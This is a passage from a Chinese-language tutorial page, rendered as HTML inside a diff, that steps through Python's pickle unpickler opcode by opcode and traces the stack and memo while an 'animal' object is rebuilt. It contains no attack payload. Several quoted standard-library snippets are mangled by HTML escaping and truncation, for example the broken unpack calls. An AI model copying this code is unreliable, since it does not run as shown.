+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span> <span class="ow">in</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">NAME_MAPPING</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">module</span><span class="p">,</span> <span class="n">name</span> <span class="o">=</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">NAME_MAPPING</span><span class="p">[(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">module</span> <span class="ow">in</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">IMPORT_MAPPING</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">module</span> <span class="o">=</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">IMPORT_MAPPING</span><span class="p">[</span><span class="n">module</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">__import__</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">proto</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">_getattribute</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">module</span><span class="p">],</span> <span class="n">name</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span><span class="c1">#3号协议</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">module</span><span class="p">],</span> <span class="n">name</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>sys.modules中的内容 储存内置方法和引用的模块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;sys&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;builtins&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_frozen_importlib&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_imp&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_thread&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_warnings&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_weakref&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_frozen_importlib_external&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;nt&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_io&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;marshal&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;winreg&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;zipimport&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_codecs&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;codecs&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;encodings.aliases&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;encodings&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;encodings.utf_8&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_signal&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;encodings.latin_1&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_abc&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;abc&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;io&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_stat&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;stat&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_collections_abc&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;genericpath&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;ntpath&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;os.path&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_sitebuiltins&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_locale&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_bootlocale&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_codecs_cn&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_multibytecodec&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;encodings.gbk&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;types&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;importlib._bootstrap&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;importlib._bootstrap_external&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;warnings&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;importlib&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;importlib.machinery&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_heapq&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;heapq&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;itertools&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;keyword&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_operator&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;operator&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;reprlib&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_collections&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;collections&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;collections.abc&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_functools&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;functools&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;contextlib&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;enum&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_sre&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;sre_constants&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;sre_parse&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;sre_compile&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;copyreg&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;re&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;typing.io&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;typing.re&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;typing&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;importlib.abc&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;importlib.util&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;mpl_toolkits&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;site&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_struct&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;struct&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_compat_pickle&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;_pickle&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;pickle&#39;</span><span class="p">:</span> <span class="p">,</span> <span class="s1">&#39;secret&#39;</span><span class="p">:</span> <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后<code>self.append(klass)</code>添加到当前栈中,所以当前栈中有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第三步读取q操作码
+BINPUT         = b&rsquo;q&rsquo;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot;
+也就是load_binput</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_binput</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="c1">#继续读取下一个字节，赋值给i</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;negative BINPUT argument&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">memo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="c1">#将栈中的栈尾(与栈顶相对)存入记忆栈中memo</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">BINPUT</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_binput</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">memo</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">类</span><span class="p">)]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第四步读取 <code>)</code>操作码 向当前栈中增加一个新的元组</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_empty_tuple</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">append</span><span class="p">(())</span><span class="c1">#向当前栈中增加一个新的元组</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">EMPTY_TUPLE</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_empty_tuple</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以当前栈中有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[,()]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第五步在读取 <code>\x81</code>操作码 # 使用弹出两次栈，用弹出的数据创建类</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_newobj</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">args</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="c1"># 空元组()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">cls</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="c1"># </span>
+</span></span><span class="line"><span class="cl">        <span class="n">obj</span> <span class="o">=</span> <span class="bp">cls</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="c1">#__new__方法的作用是修改不可变类(int,String)等基本类都是不可变类，此处不需修改，所以传入元组</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span> <span class="n">将实例化后的animal压入栈中</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">NEWOBJ</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_newobj</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第六步再次读取 <code>q</code>操作码
+这里就不说了</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">memo</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">类</span><span class="p">)</span> <span class="p">,</span> <span class="p">(</span><span class="n">对象</span><span class="p">)]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第七步读取 <code>}</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_empty_dictionary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">append</span><span class="p">({})</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">EMPTY_DICT</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_empty_dictionary</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">对象</span><span class="p">),{}]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第八步读取 <code>q</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_binput</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="c1">#继续读取下一个字节 \x02 ，赋值给i</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;negative BINPUT argument&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">memo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="c1">#将栈中的栈尾栈顶存入记忆栈中memo</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">BINPUT</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_binput</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将animal对象存储到memo[1]的栈中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">memo</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">类</span><span class="p">)</span> <span class="p">,</span> <span class="p">(</span><span class="n">对象</span><span class="p">),{}]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第九步读取 <code>X</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_binunicode</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">len</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;i&gt;6</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">maxsize</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&#34;BINUNICODE exceeds system&#39;s maximum size &#34;</span>
+</span></span><span class="line"><span class="cl">                                  <span class="s2">&#34;of </span><span class="si">%d</span><span class="s2"> bytes&#34;</span> <span class="o">%</span> <span class="n">maxsize</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="nb">len</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="s1">&#39;surrogatepass&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#再往后读len长度的字节数 animal（属性名） 然后存入到栈中中</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">BINUNICODE</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_binunicode</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将animal（属性名） 然后存入到字符串中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">对象</span><span class="p">),{},</span><span class="s2">&#34;animal&#34;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第十步读取 <code>q</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load_binput</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="c1">#继续读取下一个字节 \x03 ，赋值给i</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;negative BINPUT argument&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">memo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="c1">#将栈中的栈尾栈顶存入记忆栈中memo</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">BINPUT</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_binput</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将animal（属性名） 然后存入到字符串中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">memo</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">类</span><span class="p">)</span> <span class="p">,</span> <span class="p">(</span><span class="n">对象</span><span class="p">),{},</span><span class="s2">&#34;animal&#34;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第十一步读取 <code>X</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_binunicode</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">len</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;i&gt; 3</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">maxsize</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&#34;BINUNICODE exceeds system&#39;s maximum size &#34;</span>
+</span></span><span class="line"><span class="cl">                                  <span class="s2">&#34;of </span><span class="si">%d</span><span class="s2"> bytes&#34;</span> <span class="o">%</span> <span class="n">maxsize</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="nb">len</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="s1">&#39;surrogatepass&#39;</span><span class="p">))</span> <span class="n">dog</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#再往后读len长度的字节数 dog（属性值） 然后存入到栈中中</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">BINUNICODE</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_binunicode</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将animal（属性名） 然后存入到字符串中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">=&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="n">stack</span><span class="p">:[(</span><span class="n">对象</span><span class="p">),{},</span><span class="s2">&#34;animal&#34;</span><span class="p">,</span><span class="s2">&#34;dog&#34;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第十二步读取 <code>q</code>操作码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load_binput</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="c1">#继续读取下一个字节 \x04 ，赋值给i</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;negative BINPUT argument&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">memo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="c1">#将栈中的栈尾栈顶存入记忆栈中memo</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">BINPUT</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_binput</span>
